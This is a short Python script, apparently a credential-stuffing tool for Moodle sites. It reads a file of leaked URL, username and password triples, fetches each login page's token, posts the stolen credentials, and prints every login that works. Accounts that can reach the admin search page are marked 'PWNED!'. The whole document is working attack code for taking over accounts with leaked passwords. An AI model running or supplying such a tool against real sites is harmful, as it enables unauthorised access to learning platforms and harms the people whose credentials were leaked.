# A simple script to test leaked credentials in moodle, the lines on the file should have this format: URL:USER:PASS

import requests
from bs4 import BeautifulSoup


headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
	"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
	"Content-Type": "application/x-www-form-urlencoded", 
}

with open('creds.txt') as creds:
	login_info = creds.readline().strip().split(":")
	while login_info != [""]:
		try:
			session = requests.Session()
			url = f"https://{login_info[0]}"
			username = login_info[1]
			password = login_info[2]

			response = session.get(url, headers=headers)
			soup = BeautifulSoup(response.text, features="lxml")
			logintoken = soup.find('input', {'name': 'logintoken'}).get('value')
			data = {
				"anchor": '', 
				"logintoken": logintoken, 
				"username": username, 
				"password": password
			}

			response = session.post(url, headers=headers, data=data)
			if("Ola," in response.text):
				if("/admin/search.php" in response.text):
					print(f"{url}:{username}:{password} (PWNED!)")
				else:
					print(f"{url}:{username}:{password}")
			#else:
			#	print(f"{url}:{username}:{password} -> Nope!")
			session.close()
		except:
			pass

		login_info = creds.readline().strip().split(":")
